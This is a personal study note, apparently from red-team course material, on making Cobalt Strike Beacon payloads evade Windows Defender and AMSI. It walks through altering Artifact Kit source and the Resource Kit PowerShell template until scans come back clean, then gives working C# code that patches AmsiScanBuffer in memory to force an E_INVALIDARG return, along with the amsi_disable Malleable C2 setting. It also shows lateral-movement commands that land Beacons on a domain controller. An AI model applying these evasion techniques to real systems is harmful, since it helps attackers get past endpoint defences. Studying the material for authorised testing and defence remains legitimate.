---
creation date: September 26th 2022
last modified date: September 26th 2022
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[Bypassing Antivirus]]  
___

## Description:  

### In CobaltStrike
Cobalt Strike has two main flavours of artifact. Compiled (EXEs and DLLs); and scripts (PowerShell, VBA, SCT, etc). Each workflow uses a particular artifact - for instance, `jump psexec64` uses a compiled x64 service binary and `jump winrm64` uses x64 PowerShell.

Sometimes you will see commands fail.

The issue t is obvious if you read the error (not always easy within the XML): **"This script contains malicious content and has been blocked by your antivirus software"**; and error code `225` is **"Operation did not complete successfully because the file contains a virus or potentially unwanted software."**

`Get-MpThreatDetection` is a Windows Defender cmdlet that can also show detected threats.

```
beacon> remote-exec winrm dc-2 Get-MpThreatDetection | select ActionSuccess, DomainUser, ProcessName, Resources

ActionSuccess  : True
DomainUser     : 
ProcessName    : Unknown
Resources      : {file:_C:\Windows\c8e8647.exe, file:_\\dc-2\ADMIN$\c8e8647.exe}
PSComputerName : dc-2
RunspaceId     : 19a06a6d-7a99-4df2-926b-415b8de45b04

ActionSuccess  : True
DomainUser     : DEV\nlamb
ProcessName    : C:\Windows\System32\wsmprovhost.exe
Resources      : {amsi:_C:\Windows\System32\wsmprovhost.exe}
PSComputerName : dc-2
RunspaceId     : 19a06a6d-7a99-4df2-926b-415b8de45b04
```

Cobalt Strike provides two "kits" that allow us to modify the Beacon artifacts, obviously with the aim of avoiding detection. The **Artifact Kit** modifies the compiled artifacts and the **Resource Kit** modifies script-based artifacts.

You can also use `net helpmsg 225` to see that it was blocked by antivirus.

Before we start messing with changing the payload template, we need an idea of which part(s) Defender is detecting as malicious.  [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) takes an input file which it splits into parts, then scans each part to try and find the smallest component that triggers a positive detection.

### Artifact Kit

^0b0bf7

Generate a Windows Service EXE and save it to `C:\Payloads`, then scan it with ThreatCheck.

```
C:\>C:\Tools\ThreatCheck\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Payloads\beacon-smb-svc.exe
[+] Target file size: 289280 bytes
[+] Analyzing...

[...snip...]

[!] Identified end of bad bytes at offset 0x44E70
00000000   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
00000010   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
00000020   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
00000030   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
00000040   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
00000050   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
00000060   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
00000070   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
00000080   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ················
00000090   5F 73 65 74 5F 69 6E 76  61 6C 69 64 5F 70 61 72   _set_invalid_par
000000A0   61 6D 65 74 65 72 5F 68  61 6E 64 6C 65 72 00 00   ameter_handler··
000000B0   77 69 6E 64 69 72 00 25  73 5C 53 79 73 74 65 6D   windir·%s\System
000000C0   33 32 5C 25 73 00 72 75  6E 64 6C 6C 33 32 2E 65   32\%s·rundll32.e
000000D0   78 65 00 00 00 00 00 00  00 00 00 00 00 00 00 00   xe··············
000000E0   25 63 25 63 25 63 25 63  25 63 25 63 25 63 25 63   %c%c%c%c%c%c%c%c
000000F0   25 63 4D 53 53 45 2D 25  64 2D 73 65 72 76 65 72   %cMSSE-%d-server

[*] Run time: 8.91s

```

ThreatCheck attempts to find the end of the "bad bytes" and produces a hex dump up from that point. So the content closest to the end is what we want to focus on. It looks like the detection is coming from the string `%c%c%c%c%c%c%c%c%cMSSE-%d-server`, which is a good starting point.

Searching for where **MSSE** appears in the kit, we find it's in `bypass-pipe.c`.

```
root@kali:/opt/cobaltstrike/artifact-kit# grep -r MSSE
src-common/bypass-pipe.c:       sprintf(pipename, "%c%c%c%c%c%c%c%c%cMSSE-%d-server", 92, 92, 46, 92, 112, 105, 112, 101, 92, (int)(GetTickCount() % 9898));
```

The `dist-pipe` artifact will create a named pipe, read the shellcode over that pipe, and then executes it.

This line attempts to generate a pseudo-random pipe name. It seems as though it's already semi-obfuscated because of the slightly weird formatting. It produces a string that would look something like: `\\.\pipe\MSSE-1866-server`, where `1866` is from `GetTickCount` (which is the number of milliseconds elapsed since the computer started).

So let's just change the strings **MSSE** and **server** to something different, such as:

```
sprintf(pipename, "%c%c%c%c%c%c%c%c%cRasta-%d-pipe", 92, 92, 46, 92, 112, 105, 112, 101, 92, (int)(GetTickCount() % 9898));
```

To build these changes, run the `build.sh` script.
```
root@kali:/opt/cobaltstrike/artifact-kit# ./build.sh
```

Within the `dist-pipe` directory you'll see a new list of artifacts that have been built, along with an `artifact.cna` file. The CNA file contains some Aggressor that tells Cobalt Strike to use these artifacts inside of the default ones.
```
root@kali:/opt/cobaltstrike/artifact-kit# ls -l dist-pipe/
total 2108
-rwxr-xr-x 1 root root 312334 Mar 17 09:25 artifact32big.dll
-rwxr-xr-x 1 root root 310286 Mar 17 09:25 artifact32big.exe
-rwxr-xr-x 1 root root  41998 Mar 17 09:25 artifact32.dll
-rwxr-xr-x 1 root root  39950 Mar 17 09:25 artifact32.exe
-rwxr-xr-x 1 root root 311822 Mar 17 09:25 artifact32svcbig.exe
-rwxr-xr-x 1 root root  41486 Mar 17 09:25 artifact32svc.exe
-rwxr-xr-x 1 root root 311808 Mar 17 09:26 artifact64big.exe
-rwxr-xr-x 1 root root 312320 Mar 17 09:26 artifact64big.x64.dll
-rwxr-xr-x 1 root root  41472 Mar 17 09:26 artifact64.exe
-rwxr-xr-x 1 root root 313344 Mar 17 09:26 artifact64svcbig.exe
-rwxr-xr-x 1 root root  43008 Mar 17 09:26 artifact64svc.exe
-rwxr-xr-x 1 root root  41984 Mar 17 09:25 artifact64.x64.dll
-rw-r--r-- 1 root root   2031 Mar 17 09:25 artifact.cna
```

Copy the whole `dist-pipe` directory to `C:\Tools\cobaltstrike\ArtifactKit`.

```
C:\Tools\cobaltstrike>pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
artifact32big.exe         | 303 kB | 303.0 kB/s | ETA: 00:00:00 | 100%
artifact64svcbig.exe      | 306 kB | 306.0 kB/s | ETA: 00:00:00 | 100%
artifact32svcbig.exe      | 304 kB | 304.5 kB/s | ETA: 00:00:00 | 100%
artifact64big.exe         | 304 kB | 304.5 kB/s | ETA: 00:00:00 | 100%
artifact64.exe            | 40 kB |  40.5 kB/s | ETA: 00:00:00 | 100%
artifact64.x64.dll        | 41 kB |  41.0 kB/s | ETA: 00:00:00 | 100%
artifact.cna              | 1 kB |   2.0 kB/s | ETA: 00:00:00 | 100%
artifact32svc.exe         | 40 kB |  40.5 kB/s | ETA: 00:00:00 | 100%
artifact32.exe            | 39 kB |  39.0 kB/s | ETA: 00:00:00 | 100%
artifact64svc.exe         | 42 kB |  42.0 kB/s | ETA: 00:00:00 | 100%
artifact32.dll            | 41 kB |  41.0 kB/s | ETA: 00:00:00 | 100%
artifact64big.x64.dll     | 305 kB | 305.0 kB/s | ETA: 00:00:00 | 100%
artifact32big.dll         | 305 kB | 305.0 kB/s | ETA: 00:00:00 | 100%
```

In Cobalt Strike, go to **Cobalt Strike > Script Manager** and you'll see that this is already loaded (as mentioned previously). There's no need to load it again, but just know this is where you can load/reload CNA files.

To test the new templates, generate the same service EXE payload as before and scan it with ThreatCheck.

```
C:\Tools>C:\Tools\ThreatCheck\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Payloads\beacon-smb-svc-dist-pipe.exe
[+] No threat found!
[*] Run time: 0.89s
```

Now when we try to jump to `dc-2`, the payload is not detected by AV and we get a Beacon.

```
beacon> jump psexec64 dc-2 smb
Started service c1d61c7 on dc-2
[+] established link to child beacon: 10.10.17.71
```


### Resource Kit

^4175f5

The Resource Kit contains templates for Cobalt Strike's script-based payloads including PowerShell, VBA and HTA.
```
PS C:\Tools\cobaltstrike\ResourceKit> ls

    Directory: C:\Tools\cobaltstrike\ResourceKit

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/30/2019   9:15 PM            205 compress.ps1
-a----         8/2/2018   2:17 AM           2979 README.txt
-a----         6/9/2020   6:31 PM           4359 resources.cna
-a----         4/3/2018   8:02 PM            830 template.exe.hta
-a----         6/9/2020   6:27 PM           2732 template.hint.x64.ps1
-a----         6/9/2020   6:26 PM           2836 template.hint.x86.ps1
-a----         4/3/2018   8:02 PM            197 template.psh.hta
-a----         6/7/2017   3:26 PM            635 template.py
-a----        3/31/2018   7:23 PM           1017 template.vbs
-a----         6/9/2020   6:26 PM           2371 template.x64.ps1
-a----         6/9/2020   6:26 PM           2479 template.x86.ps1
-a----         6/7/2017   3:26 PM           3856 template.x86.vba
```

`template.x64.ps1` is the template used in `jump winrm64`, so let's focus on that.

If we just scan the template (without any Beacon shellcode even been there), ThreatCheck will show that it is indeed detected by AMSI.

```
C:\>Tools\ThreatCheck\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -e AMSI -f Tools\cobaltstrike\ResourceKit\template.x64.ps1
[+] Target file size: 2371 bytes
[+] Analyzing...

[...snip...]

[!] Identified end of bad bytes at offset 0x703
00000000   6E 74 61 74 69 6F 6E 46  6C 61 67 73 28 27 52 75   ntationFlags('Ru
00000010   6E 74 69 6D 65 2C 20 4D  61 6E 61 67 65 64 27 29   ntime, Managed')
00000020   0A 0A 09 72 65 74 75 72  6E 20 24 76 61 72 5F 74   ···return $var_t
00000030   79 70 65 5F 62 75 69 6C  64 65 72 2E 43 72 65 61   ype_builder.Crea
00000040   74 65 54 79 70 65 28 29  0A 7D 0A 0A 49 66 20 28   teType()·}··If (
00000050   5B 49 6E 74 50 74 72 5D  3A 3A 73 69 7A 65 20 2D   [IntPtr]::size -
00000060   65 71 20 38 29 20 7B 0A  09 5B 42 79 74 65 5B 5D   eq 8) {··[Byte[]
00000070   5D 24 76 61 72 5F 63 6F  64 65 20 3D 20 5B 53 79   ]$var_code = [Sy
00000080   73 74 65 6D 2E 43 6F 6E  76 65 72 74 5D 3A 3A 46   stem.Convert]::F
00000090   72 6F 6D 42 61 73 65 36  34 53 74 72 69 6E 67 28   romBase64String(
000000A0   27 25 25 44 41 54 41 25  25 27 29 0A 0A 09 66 6F   '%%DATA%%')···fo
000000B0   72 20 28 24 78 20 3D 20  30 3B 20 24 78 20 2D 6C   r ($x = 0; $x -l
000000C0   74 20 24 76 61 72 5F 63  6F 64 65 2E 43 6F 75 6E   t $var_code.Coun
000000D0   74 3B 20 24 78 2B 2B 29  20 7B 0A 09 09 24 76 61   t; $x++) {···$va
000000E0   72 5F 63 6F 64 65 5B 24  78 5D 20 3D 20 24 76 61   r_code[$x] = $va
000000F0   72 5F 63 6F 64 65 5B 24  78 5D 20 2D 62 78 6F 72   r_code[$x] -bxor
```

This particular output seems to be complaining about the small block of code around lines 26-28.
```
for ($x = 0; $x -lt $var_code.Count; $x++) {
  $var_code[$x] = $var_code[$x] -bxor 35
}
```

Using a simple Find & Replace (in Visual Studio code) for `$x` -> `$i` and `$var_code` -> `$var_banana` can help

```
for ($i = 0; $i -lt $var_banana.Count; $i++) {
  $var_banana[$i] = $var_banana[$i] -bxor 35
}
```

```
C:\>Tools\ThreatCheck\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -e AMSI -f Tools\cobaltstrike\ResourceKit\template.x64.ps1
[+] No threat found!
[*] Run time: 0.19s
```

Load `resources.cna` (in the `ResourceKit` folder) via **Cobalt Strike > Script Manager** to enable the use of the modified template. And now `jump winrm64` works.
```
beacon> jump winrm64 dc-2 smb
[+] established link to child beacon: 10.10.17.71
```

### AmsiScanBuffer

[AmsiScanBuffer](https://docs.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-amsiscanbuffer) is an API exported from `amsi.dll` - the library that implements the Antimalware Scan Interface (AMSI). Applications, such as PowerShell, will load `amsi.dll` , which you can see in tools such as Process Hacker.

When you type a cmdlet into the PowerShell console or run a script, it will pass the content to AmsiScanBuffer to determine whether or not it's malicious before executing the code. You can validate this behaviour quite easily with [API Monitor](http://www.rohitab.com/).

AMSI is integrated into lots of Windows technologies including PowerShell, .NET, the Windows Script Host (`wscript.exe` / `cscript.exe`), JavaScript, VBScript and VBA. This can do a pretty effective job at killing some of Beacon's post-ex commands, including `powershell`, `powerpick`, `psinject` and `execute-assembly`.

```
beacon> run hostname
dc-2

beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
[*] Tasked beacon to import: C:\Tools\PowerSploit\Recon\PowerView.ps1

beacon> powerpick Get-Domain
[*] Tasked beacon to run: Get-Domain (unmanaged)

ERROR: IEX : At line:1 char:1
ERROR: + $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("H4sIAAAAA ...
ERROR: + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ERROR: This script contains malicious content and has been blocked by your antivirus software.
ERROR: At line:1 char:1
ERROR: + IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:61949 ...
ERROR: + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ERROR:     + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
ERROR:     + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.Invoke 
ERROR:    ExpressionCommand
ERROR:  

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe triage
[-] Failed to load the assembly w/hr 0x8007000b
```

Let's dig into how AMSI works a bit more. Since it's designed to be implemented by third party applications, we can write a program that will submit samples for scanning.

```
using System;
using System.Runtime.InteropServices;
using System.Text;

namespace ConsoleApp
{
    class Program
    {
        static IntPtr _amsiContext;
        static IntPtr _amsiSession;

        static void Main(string[] args)
        {
            // Initialize the AMSI API.
            AmsiInitialize("Demo App", out _amsiContext);

            // Opens a session within which multiple scan requests can be correlated.
            AmsiOpenSession(_amsiContext, out _amsiSession);

            // Test sample
            var sample = Encoding.UTF8.GetBytes(@"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*");

            // Send sample to AMSI
            var result = ScanBuffer(sample);

            Console.WriteLine($"Before patch: {result}");
        }

        static string ScanBuffer(byte[] sample)
        {
            AmsiScanBuffer(_amsiContext, sample, (uint)sample.Length, "Demo Sample", ref _amsiSession, out uint amsiResult);
            return amsiResult >= 32768 ? "AMSI_RESULT_DETECTED" : "AMSI_RESULT_NOT_DETECTED";
        }

        [DllImport("amsi.dll")]
        static extern uint AmsiInitialize(string appName, out IntPtr amsiContext);

        [DllImport("amsi.dll")]
        static extern uint AmsiOpenSession(IntPtr amsiContext, out IntPtr amsiSession);

        // The antimalware provider may return a result between 1 and 32767, inclusive, as an estimated risk level.
        // The larger the result, the riskier it is to continue with the content.
        // Any return result equal to or larger than 32768 is considered malware, and the content should be blocked.
        [DllImport("amsi.dll")]
        static extern uint AmsiScanBuffer(IntPtr amsiContext, byte[] buffer, uint length, string contentName, ref IntPtr amsiSession, out uint scanResult);
    }
}

```

This will return the result `AMSI_RESULT_DETECTED` (no surprise for the EICAR test file). This is great for strings, but what about entire programs? Swapping the EICAR string for the Rubeus assembly also returns `AMSI_RESULT_DETECTED`.
```
var sample = File.ReadAllBytes(@"C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe");
```

We need to find the memory address of `AmsiScanBuffer` after `amsi.dll` has been loaded, which we can do with the `GetProcAddress` API.

```
[DllImport("kernel32.dll")]
static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
```

Get a reference to the modules loaded within the current process and iterate over each one until we find `amsi.dll,` then grab its `BaseAddress`.
```
var modules = Process.GetCurrentProcess().Modules;
var hAmsi = IntPtr.Zero;

foreach (ProcessModule module in modules)
{
    if (module.ModuleName.Equals("amsi.dll"))
    {
        hAmsi = module.BaseAddress;
        break;
    }
}

var asb = GetProcAddress(hAmsi, "AmsiScanBuffer");
```


`asb` will then contain a memory address, like`0x00007ff86ffa35e0`. Cross-reference that address in Process Hacker, and you'll see that address is within the main `RX` region of the DLL.

To write new data into this region, the memory permissions need to be changed to allow write access, for which we need the `VirtualProtect` API.

```
[DllImport("kernel32.dll")]
static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
```

If you analyse `amsi.dll` with a solution such as [IDA](https://hex-rays.com/ida-free/), you can see the execution flow of AmsiScanBuffer. Prior to scanning the provided buffer, it will check the parameters that have been supplied to the function - if everything is ok, execution will follow the "red" arrow. Otherwise, there are several branches that lead to a `mov eax, 0x80070057` instruction. This branch then "bypasses" the scanning branch before returning.

`0x80070057` is an [HRESULT](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-erref/705fb797-2175-4a90-b5a3-3918024b10b8) return code for `E_INVALIDARG`.

One thing we could do is force AmsiScanBuffer to just return a result of `E_INVALIDARG` without actually scanning the content.  So what we need are the CPU opcodes for:

```
mov eax, 0x80070057
ret
```
[This](https://defuse.ca/online-x86-assembler.htm) online x86/x64 assembler is useful for converting assembly to hex.

Make the memory region of `asb` writable, use `Marshal.Copy()` to write then new instructions, and then restore the region back to the original permissions.
```
var patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };

// Make region writable (0x40 == PAGE_EXECUTE_READWRITE)
VirtualProtect(asb, (UIntPtr)patch.Length, 0x40, out uint oldProtect);

// Copy patch into asb region
Marshal.Copy(patch, 0, asb, patch.Length);

// Restore asb memory permissions
VirtualProtect(asb, (UIntPtr)patch.Length, oldProtect, out uint _);

// Scan same sample again
result = ScanBuffer(sample);

Console.WriteLine($"After patch: {result}");
```

When the same content is scanned a second time, it comes back clean.


### AmsiScanBuffer Automatted

^7a294d

This is great, but how can we integrate it into Cobalt Strike's workflow? There's actually a Malleable C2 directive called `amsi_disable` that will automate all this for us!

The **Malleable Command & Control** section goes into more depth on specifically what Malleable C2 is and how to customise it. To enable the `amsi_disable` directive, add the following to your profile:

```
post-ex {
    set amsi_disable "true";
}
```

This will tell Beacon to patch the AmsiScanBuffer function for `powerpick`, `execute-assembly` and `psinject` commands.

```
beacon> run hostname
dc-2

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe triage

Action: Triage Kerberos Tickets (All Users)

[*] Current LUID    : 0x3e3735
[...snip...]
```




___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: September 26th 2022 (12:54 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
